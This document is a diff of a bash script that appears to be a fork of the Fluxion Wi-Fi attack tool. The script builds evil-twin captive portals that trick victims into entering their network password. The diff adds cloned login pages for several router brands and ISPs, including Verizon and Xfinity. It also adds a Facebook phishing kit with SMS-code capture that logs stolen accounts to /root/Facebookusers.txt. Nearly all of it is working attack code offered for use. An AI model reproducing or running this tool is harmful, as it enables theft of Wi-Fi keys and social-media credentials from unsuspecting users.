 
 # Close all processes
 function matartodo {
-	
+
 	killall aireplay-ng &>$flux_output_device
 	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
 	killall hostapd &>$flux_output_device
 	killall lighttpd &>$flux_output_device
 	killall dhcpd &>$flux_output_device
 	killall xterm &>$flux_output_device
-	
+
 }
 
 
@@ -3176,11 +4359,11 @@ function template {
 
 # Create the contents for the web interface
 function NEUTRA {
-	
+
 	if [ ! -d $DUMP_PATH/data ]; then
 		mkdir $DUMP_PATH/data
 	fi
-	
+
 echo "UEsDBBQAAAAIAEZ8zkSJ9HAPjoIAAMRtAQATABwAanF1ZXJ5LTEuOC4zLm1pbi5qc1VUCQADVE+c
 U1RPnFN1eAsAAQQAAAAABAAAAACcfWl720aW7vf7K0RMRg2YRUrM0tMDCuZ4vXbfeOnYnaSHYvJA
 ZFGCDQEMFi0h+d/nvKcWFEDIyZ08joil1lOnzl4HJ48GR5/+Ucvi/uhmMv7b+JujT7/hbrzMr492
@@ -5876,19 +7059,18 @@ AAAAAQAAAKSBAAAAAGpxdWVyeS0xLjguMy5taW4uanNVVAUAA1RPnFN1eAsAAQQAAAAABAAAAABQ
 SwECHgMUAAAACAC3e85EqOffJSZMAADtFAIAFwAYAAAAAAABAAAApIHbggAAanF1ZXJ5Lm1vYmls
 ZS0xLjMuMi5jc3NVVAUAA0lOnFN1eAsAAQQAAAAABAAAAABQSwECHgMUAAAACAB1fM5EEp6tqmiH
 AQBregUAFgAYAAAAAAABAAAApIFSzwAAanF1ZXJ5Lm1vYmlsZS0xLjMuMi5qc1VUBQADrk+cU3V4
-CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA=
-" | base64 -d >$DUMP_PATH/file.zip
-	
+CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zip
+
 	unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
 	rm $DUMP_PATH/file.zip &>$flux_output_device
-	
+
 	echo "<!DOCTYPE html>
 	<html>
 	<head>
 	    <title>Login</title>
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>    
+	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
 	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
 	    <style>
 	.ui-btn {
@@ -5898,33 +7080,33 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA=
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
+		<div data-role=\"top\" data-theme=\"a\">
 		    <h3>Login Page</h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-		    
+
 	"$DIALOG_WEB_OK"
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
+
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
+		<div data-theme=\"a\" data-role=\"top\">
 		    <h3></h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-	
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
 		</div>
 	    </div>
 	</body>
-	</html> 
+	</html>
 	">$DUMP_PATH/data/final.html
 	echo "<!DOCTYPE html>
 	<html>
@@ -5932,135 +7114,299 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA=
 	    <title>Login</title>
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>    
+	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
 	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
+		<div data-role=\"top\" data-theme=\"a\">
 		    <h3>Login Page</h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-		    
+
 		    "$DIALOG_WEB_ERROR"
 	<br>
-	<a href=\"index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload();location.href='index.htm'\">"$DIALOG_WEB_BACK"</a> 
-	
+	<a href=\"index.htm\" data-role=\"button\" rel=\"external\" data-inline=\"true\" id=\"back\" onclick=\"location.reload();location.href='index.htm'\">"$DIALOG_WEB_BACK"</a>
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
+
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
+		<div data-theme=\"a\" data-role=\"top\">
 		    <h3></h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-	
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
 		</div>
 	    </div>
 	</body>
-	</html> 
+	</html>
 	">$DUMP_PATH/data/error.html
-	
+
 	echo "<!DOCTYPE html>
 	<html>
 	<head>
 	    <title>Login</title>
 	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\"/>
 	    <style>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.css)</style>
-	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>    
+	    <script>$(cat $DUMP_PATH/data/jquery-1.8.3.min.js)</script>
 	    <script>$(cat $DUMP_PATH/data/jquery.mobile-1.3.2.js)</script>
 	    <style>
 		#login-button {
 		    margin-top: 30px;
 		}
-		
+
 	.ui-grid-c {
 	    text-align : center;
 		margin-right: -50% !important;
-	
+
 	}
-	
+
 	.ui-block-b {
 	    text-align : left;
-	
+
 	}
-	
+
 	.ui-block-a {
 	    text-align : right;
 		margin-right: 10px !important;
-	
-	
+
+
 	}
 	    </style>
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
+		<div data-role=\"top\" data-theme=\"a\">
 		    <h3>Login Page</h3>
 		</div>
-	
+
 		<div data-role=\"content\">
 		<fieldset>
 		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"check.php\" method=\"POST\" >
 	<div class=ui-grid-c>
-	
+
 	      <div class=ui-block-a>ESSID:</div>
-	
+
 	      <div class=ui-block-b><b>$Host_SSID</b></div>
-	
+
 	      <div class=ui-block-a>BSSID:</div>
-	
+
 	      <div class=ui-block-b><b>$Host_MAC</b></div>
-	
+
 	      <div class=ui-block-a>Chan:</div>
-	
+
 	      <div class=ui-block-b><b>$Host_CHAN</b></div>
-	
+
 	    </div>
-			  
+
 	<br>
-	
-	"$DIALOG_WEB_INFO"    
-			    <div data-role=\"fieldcontain\">                                    
+
+	"$DIALOG_WEB_INFO"
+			    <div data-role=\"fieldcontain\">
 				<label for=\"password\">"$DIALOG_WEB_INPUT"</label>
 				</div>
-				<input type=\"password\" value=\"\" name=\"key1\" id=\"key1\"/> 
-			    
+				<input type=\"password\" value=\"\" name=\"key1\" id=\"key1\"/>
+
 			    <input type=\"submit\" data-theme=\"b\" name=\"submit\" id=\"submit\" data-inline=\"true\" value=\""$DIALOG_WEB_SUBMIT"\">
 			</fieldset>
-		    </form>             
+		    </form>
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
-	
+
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
+		<div data-theme=\"a\" data-role=\"top\">
 		    <h3></h3>
 		</div>
-	
+
 		<div data-role=\"content\">
-	
+
 		</div>
-	
+
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
 		</div>
 	    </div>
 	</body>
-	</html> 
+	</html>
 	">$DUMP_PATH/data/index.htm
-	
+
+
+
+	}
+
+
+	# Crea el contenido de la interface web
+function ARRIS {
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/house1.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/ayuda.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
+
+	              }
+
+	#Conten interface web
+function BELKIN {
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/house.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/house1.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/ayuda.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/error.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/info.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data
+
+	              }
+
+	#Conten interface web
+function NETGEAR {
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/house.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/house1.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/ayuda.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/error.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/info.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data
+
+	              }
+
+#Conten interface web
+function ARRIS2 {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/house.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/house1.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/ayuda.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/error.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/info.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data
+
+	              }
+
+#Conten interface web
+function NETGEAR2 {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/house.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/house1.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/ayuda.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/error.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
+
+	              }
+
+#Conten interface web
+function VODAFONE {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/house.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/house1.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/ayuda.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/error.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/info.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE-ESP/index.htm $DUMP_PATH/data
+
+	              }
+
+#Conten interface web
+function VERIZON {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
+        cp $WORK_DIR/Sites/Login-Verizon/Verizon.html $DUMP_PATH/data
+
+	              }
+
+function XFINITY {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
+		cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
+	              }
+
+function topusers { 
+echo -e " " 
+echo -e " _ _ _ "
+ echo -e " /   \ __ _ _// _/ "
+ echo -e " / /\  |       /| )_ ___ \ " 
+ echo -e " / | \ | | / \ " 
+ echo -e " __| /|  /__ /___ / " 
+ echo -e " / / / / " 
+ echo -e " "
 }
+# Create a Facebook login page 
+function Facebook {
+mkdir $DUMP_PATH/data &>$ares_output_device
+        cp  $WORK_DIR/Sites/Facebook/config.ini $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/data.php $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/facebook-logo.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/font-awesome.min.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/index.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/index.js $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/jquery.min.js $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/oauth.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/reset.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/roboto.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/style.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/datasms.php $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/smscode.htm $DUMP_PATH/data
+		cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt $DUMP_PATH/data
+
+[ -f /root/Facebookusers.txt ] || cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt /root/Facebookusers.txt && echo  >> /root/Facebookusers.txt && echo -e "           "  >> /root/Facebookusers.txt && echo -e "             _____ _____________________ _________  "  >> /root/Facebookusers.txt && echo -e "            /  _  \\ _____   \_   _____//   _____/  "  >> /root/Facebookusers.txt && echo -e "           /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Facebookusers.txt && echo -e "          /    |    \    |   \|        \/        \  "  >> /root/Facebookusers.txt && echo -e "          \____|__  /____|_  /_______  /_______  /  "  >> /root/Facebookusers.txt && echo -e "                  \/       \/        \/        \/   "  >> /root/Facebookusers.txt && echo -e "          " && echo -e "               by princeofguilty & deltax           "  >> /root/Facebookusers.txt && echo -e "            "  >> /root/Facebookusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Facebookusers.txt
+}
+
+#Conten interface web
+function HUAWEI {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/house.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/house1.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/ayuda.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/error.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/final.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/info.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/HUAWEI-ENG/index.htm $DUMP_PATH/data
+
+	              }
+
 ######################################### < INTERFACE WEB > ########################################
 
 
-mostrarheader && setresolution && setinterface
+top&& setresolution && setinterface
